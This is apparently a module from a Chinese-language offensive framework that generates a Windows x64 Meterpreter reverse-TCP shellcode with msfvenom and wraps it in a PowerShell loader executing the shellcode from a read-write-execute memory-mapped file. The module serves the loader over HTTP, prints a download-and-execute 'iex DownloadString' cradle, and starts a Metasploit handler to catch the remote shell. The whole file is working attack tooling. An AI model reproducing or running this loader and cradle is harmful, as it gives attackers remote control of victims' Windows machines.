import os,sys,shutil
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient

class Exploit(TCPClient):
    __info__ = {
        "name": "mmfml_MSF_shellcode",
        "\033[91m内容描述\033[0m": "mmfml_MSF_shellcode模块叙述：\n"
                        "Powershell代码需要PS v5 +才能运行。Powershell代码目前仅适用于64位系统。\n",

        "\033[91m参考链接\033[0m": (
             "http://www.ggsec.cn/mmfml.html\n"
             "https://github.com/prnd432/MMFml"
        ),

        "\033[91m作者\033[0m": (
            "Demon",
        ),
    }

    lhost = OptIP("", "远程目标IP地址")
    lport = OptPort(4444, "本地监听端口")
    open = OptString("ture", "是否开启MSF 填写ture/none")


    def run(self):
        LHOST=(self.lhost)
        LPORT=(self.lport)
        OPEN=(self.open)
        os.system("msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s  -b \'\\x00\' -f powershell \
        | sed \'s/\[Byte\\[\\]\\] $buf =//g\' >>shellcode.txt " %(LHOST,LPORT))

        path=os.getcwd()+"/shellcode.txt"
        for line in open(path):
            open(path).close()
        MMFml='''function Invoke-MMFml {
        [CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
            [Parameter( ParameterSetName = 'RunLocal' )]
            [ValidateNotNullOrEmpty()]
            [Byte[]]
            $Shellcode,
            [Switch]
            $Force = $False
        )

            Set-StrictMode -Version 2.0

            #Function from Matt Graeber (@mattifestation), from https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1.
            function Get-DelegateType
            {
                Param
                (
                    [OutputType([Type])]

                    [Parameter( Position = 0)]
                    [Type[]]
                    $Parameters = (New-Object Type[](0)),

                    [Parameter( Position = 1 )]
                    [Type]
                    $ReturnType = [Void]
                )

                $Domain = [AppDomain]::CurrentDomain
                $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
                $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
                $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')

                Write-Output $TypeBuilder.CreateType()
            }

            function Get-ShellCode
            {
                param(
                    [Parameter(Mandatory=$false)][Byte[]]$shellcodeBase
                )
                # Shellcode Stub
                $shellcode = [byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,
                                    0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,
                                    0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,
                                    0x31,0xC0,0xC3)
                if(!($shellcodeBase)){
                    # This shellcode is the default payload used if none is specified
                    # This shellcode was created using - msfvenom -p windows/x64/exec CMD="cmd.exe -c calc.exe" -f powershell
                    $shellcodeBase =  [byte[]] @(
                    '''+line+'''
                )}
                $shellcode += $shellcodeBase
                #Add RET to attempt to prevent Powershell from crashing when exiting
                $shellcode += [byte[]]@(0xC3)
                return $shellcode
            }

            $enc = [System.Text.Encoding]::UTF8 #using UTF8 means bytewise translation is 1:1 for size.

            $shellcode = Get-ShellCode($shellcode)

            #Create MMF w/ RWX & length of shellcode, with MMF name 'exe'
            [System.IO.MemoryMappedFiles.MemoryMappedFile]$mmfml = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew([string]'exe', [long]$shellcode.length,
            [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute, [System.IO.MemoryMappedFiles.MemoryMappedFileOptions]::None,
            [System.IO.MemoryMappedFiles.MemoryMappedFileSecurity]::new(), [System.IO.HandleInheritability]::Inheritable)

            #Create MMF View Stream & write contents of shellcode to the MMF via the View Stream
            $view = $mmfml.CreateViewStream(0,0)
            $view.Write($shellcode, 0,$shellcode.length)
            $view.Position = 0

            #Create View Accessor, get shellcode memory location using DangerousGetHandle()
            $acc = $mmfml.CreateViewAccessor(0,0, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)
            $memhandle = $acc.SafeMemoryMappedViewHandle.DangerousGetHandle()
            #returns shellcode memory location...
            Write-Host "Executing payload at:"
            Write-Host 0x$($memhandle.ToString("X$([IntPtr]::Size*2)"))""

            #Build a Delegate & Invoke from Pointer
            $ByRefDelegate = Get-DelegateType @([IntPtr].MakeByRefType()) ([Void])
            $ByRef = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memhandle, $ByRefDelegate)
            $ByRef.Invoke([ref]$memhandle)
        }
        '''
        with open('MMFml.ps1','w') as f:    #设置文件对象
             f.write(MMFml)                 #将字符串写入文件中
        os.system("python3 -m http.server 8888 >/dev/null 2>&1 &")
        print ("\033[92m[+]\033[0m  powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://%s:8888/MMFml.ps1')\";Invoke-MMFml"%(LHOST))
        os.remove('shellcode.txt')
        #yes= input("\033[94m[*]\033[0m 是否启动MSF yes: ")  #必须执行客户端才能使用shell命令
        if OPEN =="ture":
                configFile = open('handler_MSF.rc','w')
                configFile.write('printf "\033c"\n')
                configFile.write('use exploit/multi/handler\n')
                configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
                configFile.write('set LHOST ' + str(LHOST) + '\n')
                configFile.write('set LPORT ' + str(LPORT) + '\n')
                configFile.write('exploit -j\n')
                configFile.close()
                os.system('msfconsole -r handler_MSF.rc')
                os.remove('handler_MSF.rc')
                os.remove('MMFml.ps1')
        elif OPEN =="none":
                print("\033[92m[+]\033[0m 不开启MSF")
